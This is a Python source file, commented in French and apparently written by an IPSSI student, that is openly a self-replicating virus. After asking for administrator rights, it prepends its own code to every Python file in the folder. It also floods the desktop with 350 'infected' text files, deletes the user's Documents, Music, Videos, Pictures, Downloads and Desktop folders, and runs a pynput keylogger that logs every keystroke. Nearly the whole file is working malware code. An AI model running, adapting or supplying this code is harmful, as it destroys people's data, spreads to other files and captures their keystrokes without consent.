# DebutVirus

#code INJECTÉ    

# FinVirus

import sys,glob
import itertools,subprocess,sys,os
import time
import ctypes
import shutil

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    # Code of your program here


    #----------Auto-réplication----------

    #Le virus charge son propre code
    virus_code = []
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()

    # Permet de vérifier le code du virus "# DebutVirus" et "# FinVirus\n" servent de délimitateurs
    EstInfecte = False
    for line in lines:
        if line == "# DebutVirus":
            EstInfecte = True
        if not EstInfecte:
            virus_code.append(line)
        if line == "# FinVirus\n":
            break

    #----------Infection de fichiers----------

    # Détection des fichiers .py et .pyw
    seek_Python_Files = glob.glob('*.py') + glob.glob('*.pyw')

    for file in seek_Python_Files:
        with open(file, 'r') as f:
            file_code = f.readlines()
        
        corrompu = False
        #Si il y a # DebutVirus\n au début = NE PAS injecter le code
        for line in file_code:
            if line == "# DebutVirus\n":
                corrompu = True
                break
        
        #Si il n'y a pas # DebutVirus\n au début = injecter le code
        if not corrompu:
            final_code = []
            final_code.extend(virus_code)
            final_code.extend('\n')
            final_code.extend(file_code)
            
            with open(file, 'w') as f:
                f.writelines(final_code)

    print("")
    print("Infection des fichiers en cours ...")
    print("")

    #----------SPAM fichiers bureau----------

    #Aller sur le bureau de l'utilisateur actuel
    path = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))

    print("INFECTION DU BUREAU EN COURS...")

    #Création de 350 fichiers texte 
    for x in range(350):
        file = open(path+"\INFECTED-IPSSI-%d.txt" % x, "w")
        file.write("Votre PC à été infécté par un étudiant de l'IPSSI")
        file.close()

    #----------------Delete les fichiers utilisateur---------------

    #ignore_errors=True = Delete aussi les read only files
    pathDocument = str(os.path.join(os.environ['USERPROFILE'], "Documents"))
    shutil.rmtree(pathDocument, ignore_errors=True)

    pathMusic = str(os.path.join(os.environ['USERPROFILE'], "Music"))
    shutil.rmtree(pathMusic, ignore_errors=True)

    pathVideos = str(os.path.join(os.environ['USERPROFILE'], "Videos"))
    shutil.rmtree(pathVideos, ignore_errors=True)

    pathPictures = str(os.path.join(os.environ['USERPROFILE'], "Pictures"))
    shutil.rmtree(pathPictures, ignore_errors=True)

    pathDownloads = str(os.path.join(os.environ['USERPROFILE'], "Downloads"))   
    shutil.rmtree(pathDownloads, ignore_errors=True)

    pathDesktop = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))   
    shutil.rmtree(pathDesktop, ignore_errors=True)

    #----------------KEYLOGGER---------------

    #Un simple keylogger qui est détécté par Windows ( afin d'éviter un immense code dédié )

    #Installation du module pynput
    os.system('python -m pip install pynput')

    from pynput.keyboard import Key, Listener
    import logging
    
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    
    def on_press(key):
        logging.info(str(key))
    
    with Listener(on_press=on_press) as listener :
        listener.join()

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
